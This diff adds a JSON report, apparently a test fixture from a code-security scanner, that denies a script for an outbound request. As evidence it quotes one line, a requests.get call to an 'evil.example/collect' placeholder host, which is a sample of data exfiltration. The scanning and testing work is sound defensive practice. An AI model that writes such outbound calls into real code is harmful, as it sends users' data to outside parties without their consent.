@@ -1,0 +1,28 @@
+{
+  "results": [
+    {
+      "file": "risky_network.py",
+      "report": {
+        "decision": "deny",
+        "risk_level": "high",
+        "findings": [
+          {
+            "rule_id": "NET-001",
+            "category": "network",
+            "risk_level": "high",
+            "action": "deny",
+            "message": "The script connects to a domain that is not allowlisted.",
+            "evidence": "requests.get(\"https://evil.example/collect\")",
+            "line_number": 3,
+            "column": 0,
+            "recommendation": "Add a reviewed hostname to the policy allowlist or remove the outbound request."
+          }
+        ],
+        "duration_ms": 0.134,
+        "sanitized": true,
+        "policy_version": "1",
+        "input_sha256": "0cd418659754112e09d6c329f17a84be48fd8088aa7ae10d3bb139533a61a618"
+      }
+    }
+  ]
+}
